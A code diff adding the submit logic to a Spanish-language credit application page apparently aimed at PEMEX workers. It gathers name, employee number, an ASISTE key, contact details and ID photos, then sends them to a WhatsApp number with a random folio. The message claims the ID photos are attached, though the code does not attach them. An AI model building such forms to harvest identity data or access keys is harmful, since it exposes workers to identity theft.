@@ -592,4 +592,36 @@ const TIPOS = { activo_sind:'Trabajador Activo Sindicalizado', activo_conf:'Trab
 
 document.getElementById('btnEnv').addEventListener('click', function(){
   if(!document.getElementById('chk1').checked||!document.getElementById('chk2').checked){
-    alert('⚠️ Por favor marca las do
+    alert('⚠️ Por favor marca las dos casillas antes de enviar.');return;
+  }
+  if(!ineFiles.frente||!ineFiles.reverso){
+    alert('⚠️ Por favor sube las fotos de tu INE (frente y reverso).');return;
+  }
+
+  const folio = 'PM'+Math.floor(Math.random()*90000+10000);
+  const msg =
+    '🏦 *SOLICITUD DE CRÉDITO SEFYP*\n'+
+    '📋 Folio: *'+folio+'*\n\n'+
+    '👷 *Tipo:* '+(TIPOS[tipoSel]||tipoSel)+'\n'+
+    '🏦 *Banco:* '+bancoSel+'\n\n'+
+    '📋 *DATOS PERSONALES*\n'+
+    '• Nombre: '+g('f_nombre')+'\n'+
+    '• Ficha PEMEX: '+g('f_ficha')+'\n'+
+    '• Clave ASISTE: '+g('f_asiste')+'\n'+
+    '• Correo: '+g('f_correo')+'\n'+
+    '• Teléfono: '+g('f_tel')+'\n\n'+
+    '🪪 *INE:* Adjunto frente y reverso\n\n'+
+    '✅ Autoriza uso de datos para trámite de crédito.\n'+
+    '📅 '+new Date().toLocaleString('es-MX');
+
+  const url = 'https://wa.me/'+WA_NUM+'?text='+encodeURIComponent(msg);
+  window.open(url, '_blank');
+
+  document.getElementById('s3').classList.remove('on');
+  document.getElementById('okScreen').classList.add('on');
+  document.getElementById('folioNum').textContent = folio;
+  window.scrollTo({top:0,behavior:'smooth'});
+});
+</script>
+</body>
+</html>
